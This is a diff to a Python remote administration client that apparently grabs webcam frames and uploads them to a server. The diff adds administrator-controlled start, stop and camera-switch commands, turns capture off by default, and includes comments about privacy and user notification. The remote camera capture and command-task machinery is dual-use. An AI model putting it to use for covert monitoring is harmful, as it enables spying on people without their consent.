@@ -1745,28 +1745,38 @@ def capture_subprocess_windows_full():
 # ============================================================
 # WEBCAM CAPTURE
 # ============================================================
-def capture_webcam():
+def capture_webcam(camera='front'):
+    """Grab one frame. `camera` selects front/back where the device exposes
+    more than one index; anything unavailable falls back to index 0."""
     if not capability_profile().get('webcam'):
         return None
     try:
         import cv2
-        cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            cap.release()
-            return None
-        
-        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-        
-        ret, frame = cap.read()
-        cap.release()
-        
-        if ret:
-            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, WEBCAM_QUALITY])
-            return base64.b64encode(buffer.tobytes()).decode()
-    except:
-        pass
-    
+    except ImportError:
+        return None
+
+    # Try the requested index first, then 0, then 1.
+    requested = 1 if str(camera).lower() == 'back' else 0
+    for index in (requested, 0, 1):
+        cap = None
+        try:
+            cap = cv2.VideoCapture(index)
+            if not cap.isOpened():
+                continue
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            ret, frame = cap.read()
+            if ret:
+                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, WEBCAM_QUALITY])
+                return base64.b64encode(buffer.tobytes()).decode()
+        except Exception:
+            continue
+        finally:
+            if cap is not None:
+                try:
+                    cap.release()
+                except Exception:
+                    pass
     return None
 
 
@@ -2172,6 +2182,11 @@ class ALLEYESXClient:
         self.running = True
         self.registered = False
         self.last_heartbeat_time = 0.0
+        # Camera capture is OFF until an administrator explicitly starts it.
+        # Streaming the webcam continuously was both a privacy problem and a
+        # waste of CPU on a modest machine.
+        self.webcam_enabled = False
+        self.webcam_camera = 'front'
         self.last_screenshot_time = 0
         self.last_webcam_time = 0
         self.last_touch_poll_time = 0
@@ -2288,6 +2303,10 @@ class ALLEYESXClient:
         task_type = task.get('type', 'command')
         task_id = task.get('id', '')
 
+        if task_type == 'webcam_command':
+            self.apply_webcam_command(task)
+            return
+
         if task_type == 'notify_user':
             # Visible, non-blocking notice. The remote user is told the
             # administrator has taken control - the session is never silent.
@@ -2390,17 +2409,34 @@ class ALLEYESXClient:
             pass
 
     def send_webcam(self):
+        if not self.webcam_enabled:
+            return
         now = time.time()
         if now - self.last_webcam_time < WEBCAM_INTERVAL:
             return
         self.last_webcam_time = now
-        
+
         try:
-            image_b64 = capture_webcam()
+            image_b64 = capture_webcam(camera=self.webcam_camera)
             if image_b64:
                 api_request_raw(f'/api/webcam/{self.device_id}', {'image': image_b64})
-        except:
-            pass
+        except Exception as e:
+            print(f"[-] Webcam capture failed: {e}")
+            self.webcam_enabled = False
+
+    def apply_webcam_command(self, task):
+        """Handle start / stop / switch delivered over the heartbeat queue."""
+        cmd = (task.get('command') or '').lower()
+        if cmd == 'start':
+            self.webcam_camera = task.get('camera', 'front')
+            self.webcam_enabled = True
+            print(f"[+] Webcam streaming ENABLED by administrator (camera={self.webcam_camera})")
+        elif cmd == 'stop':
+            self.webcam_enabled = False
+            print("[-] Webcam streaming disabled")
+        elif cmd == 'switch':
+            self.webcam_camera = task.get('camera', 'front')
+            print(f"[*] Webcam switched to {self.webcam_camera}")
 
     def run(self):
         print("""
